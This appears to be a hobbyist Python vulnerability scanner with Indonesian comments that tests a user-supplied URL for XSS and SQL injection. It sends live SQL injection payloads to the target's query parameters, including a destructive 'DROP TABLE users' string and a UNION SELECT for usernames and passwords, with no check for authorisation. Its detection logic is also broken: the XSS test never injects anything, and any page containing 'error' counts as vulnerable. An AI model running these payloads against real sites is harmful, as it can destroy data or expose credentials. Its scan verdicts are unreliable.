import requests
from urllib.parse import urlparse, parse_qs

def check_xss(url):
    # Daftar payload XSS untuk diuji
    xss_payloads = [
        "<script>alert('XSS')</script>"
    ]

    try:
        response = requests.get(url)

        for payload in xss_payloads:
            if payload in response.text:
                return f"Kerentanan XSS ditemukan menggunakan payload: {payload}"

        return f"Selamat. Tidak ditemukan kerentanan XSS"
    except Exception as e:
        return f"Error pada pengecekan XSS: {e}"

def check_sql_injection(url):
    # Daftar payload SQL untuk diuji
    sql_payloads = [
        #"'",
        "'; DROP TABLE users; --",
        "'; SELECT * FROM users; --",
        "' OR '1'='1'; --",
        '" OR "1"="1"; --',
        "'; --",
        '"; --',
        "--",
        "#",
        "';/*",
        "') OR ('1'='1'); --",
        "UNION SELECT username, password FROM users; --"
        # Tambahkan lebih banyak payload jika diperlukan
    ]

    try:
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        for param, values in query_params.items():
            for value in values:
                for payload in sql_payloads:
                    modified_url = url.replace(f"{param}={value}", f"{param}={value}{payload}")
                    response = requests.get(modified_url)
                    if "SQL syntax error" in response.text or "error" in response.text.lower():
                        return f"Kerentanan SQL Injection ditemukan menggunakan payload: {payload}"

        return f"Selamat. Tidak ditemukan kerentanan SQL Injection"
    except Exception as e:
        return f"Error pada pengecekan SQL Injection: {e}"

def main():
    print("Simple XSS & SQL Injection Scanner")
    print("by Nadhiar Ridho Wahyu Pradana")

    # Dapatkan URL dari pengguna
    url = input("Masukkan alamat URL:")

    # Lakukan pemeriksaan keamanan
    print("\nSedang melakukan pengecekan...\n")
    xss_result = check_xss(url)
    sql_result = check_sql_injection(url)

    # Tampilkan hasil
    print("Hasil Pengecekan XSS :", xss_result)
    print("Hasil Pengecekan SQL Injection:", sql_result)

if __name__ == "__main__":
    main()
